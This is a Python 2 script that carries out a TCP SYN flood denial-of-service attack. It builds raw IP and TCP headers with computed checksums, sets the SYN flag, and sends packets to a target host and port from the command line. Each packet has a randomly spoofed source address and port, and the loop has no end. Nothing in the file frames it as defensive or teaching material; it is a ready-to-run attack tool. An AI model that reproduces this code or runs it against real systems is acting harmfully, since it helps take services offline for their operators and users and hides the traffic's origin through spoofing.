#!/usr/bin/env python
#coding: utf-8
import sys
from struct import pack, pack_into, unpack, unpack_from
import socket
import argparse
from random import randint

def check_sum(header_byte):
    """http://stackoverflow.com/a/3954192"""
    if len(header_byte) & 1:
        header_byte += '\0'

    sum = 0
    for i in range(0, len(header_byte), 2):
        word = unpack_from('>H', header_byte, i)[0]
        sum += word
        sum = (sum >> 16) + (sum & 0xFFFF)

    return ~sum & 0xFFFF

def ip_header(src_ip, dst_ip):
    """ ip header structure, see http://www.freesoft.org/CIE/Course/Section3/7.htm
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |Version|  IHL  |Type of Service|          Total Length         |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |         Identification        |Flags|      Fragment Offset    |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |  Time to Live |    Protocol   |         Header Checksum       |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                       Source Address                          |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                    Destination Address                        |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                    Options                    |    Padding    |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+   
    """
    """
    ┌───────────────────────────────────────────────────┐
    │IP Header fields modified on sending by IP_HDRINCL │
    ├──────────────────────┬────────────────────────────┤
    │IP Checksum           │Always filled in.           │
    ├──────────────────────┼────────────────────────────┤
    │Source Address        │Filled in when zero.        │
    ├──────────────────────┼────────────────────────────┤
    │Packet Id             │Filled in when zero.        │
    ├──────────────────────┼────────────────────────────┤
    │Total Length          │Always filled in.           │
    └──────────────────────┴────────────────────────────┘
    """
    ver = 4
    hdr_len = 5  # metric 4 bytes
    tos = 0  # type of service
    # kernel will fill the correct total length
    # see http://stackoverflow.com/a/15636651
    tot_len = 0  
    id = 54321  # identification for defragment
    # frag_flags = 0  # only 3 bits long, merged to offset
    frag_off = 0  # fragment offset
    ttl = 255
    proto = socket.IPPROTO_TCP  # up layer protocol
    check = 0  # kernel will fill the correct checksum

    ver_hdr_len = (ver << 4) | hdr_len
    # yeah, ! is necessary
    return pack('!BBHHHBBHLL', ver_hdr_len, tos, tot_len, 
            id, frag_off, ttl, proto, check, src_ip, dst_ip)

def tcp_header(src_ip, src_port, dst_ip, dst_port):
    """ tcp header
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |          Source Port          |       Destination Port        |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                        Sequence Number                        |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                    Acknowledgment Number                      |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |  Data |           |U|A|P|R|S|F|                               |
    | Offset| Reserved  |R|C|S|S|Y|I|            Window             |
    |       |           |G|K|H|T|N|N|                               |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |           Checksum            |         Urgent Pointer        |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                    Options                    |    Padding    |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                             data                              |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    """
    seq_num = 0  # sequence number
    ack_num = 0  # acknowledgement number
    data_off = 5  # metric 4 bytes, data offset, means header length
    urg = 0
    ack = 0
    psh = 0
    rst = 0
    syn = 1
    fin = 0
    win_size = socket.htons(5840)  # maximum allowed window size
    check = 0
    urg_ptr = 0  # works only when urg is set

    # data offset and reserved and flags, reserved is 6 bytes long and should be 0s
    off_resv_flags = (data_off<<12) | (urg<<5) | (ack<<4) | \
        (psh<<3) | (rst<<2) | (syn<<1) | fin

    header_unchecked = pack('!HHIIHHHH', src_port, dst_port,
            seq_num, ack_num, off_resv_flags, win_size, check, urg_ptr)

    """ TCP pseudo header, used to calc checksum
       octet    octet   octet     octet
    +--------+--------+--------+--------+
    |           Source Address          |
    +--------+--------+--------+--------+
    |         Destination Address       |
    +--------+--------+--------+--------+
    |Reserved|Protocol|    TCP Length   |
    +--------+--------+--------+--------+
    """
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_len = len(header_unchecked)

    ph = pack('!LLBBH', src_ip, dst_ip, placeholder, protocol, tcp_len)

    check = check_sum(ph + header_unchecked)
    header = bytearray(header_unchecked)
    pack_into('!H', header, 16, check)
    return header

def raw_sock():
    """create a raw socket"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        # tell kernel not to put in headers, since we are providing it
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except socket.error as msg:
        print >> sys.stderr, 'Socket could not be created. Error Code:%s, Message %s' % (str(msg[0]), msg[1])
        sys.exit()
    return sock

def parse_args():
    parser = argparse.ArgumentParser()
    # Cannot flood localhost, why?
    parser.add_argument('hostname', help='target host')
    parser.add_argument('port', default=80, nargs='?', help='target port', type=int)
    parser.add_argument('-v', '--verbose', help='verbose mode', action='store_true')

    args = parser.parse_args()
    return socket.gethostbyname(args.hostname), args.port, args.verbose

if __name__ == '__main__':
    dst_ip_str, dst_port, v = parse_args()
    dst_ip = unpack('!L', socket.inet_aton(dst_ip_str))[0]
    sock = raw_sock()

    while True:
        src_ip = randint(0x01000000, 0xdfffffff)
        src_port = randint(1, 65535)
        if v:
            print '%s:%d => %s:%d' % (socket.inet_ntoa(pack('!L', src_ip)), src_port,
                    dst_ip_str, dst_port)
        ip_hdr = ip_header(src_ip, dst_ip)
        tcp_hdr = tcp_header(src_ip, src_port, dst_ip, dst_port)
        if sock.sendto(ip_hdr + tcp_hdr, (dst_ip_str, 0)) < 0:
            print 'Error'
            break
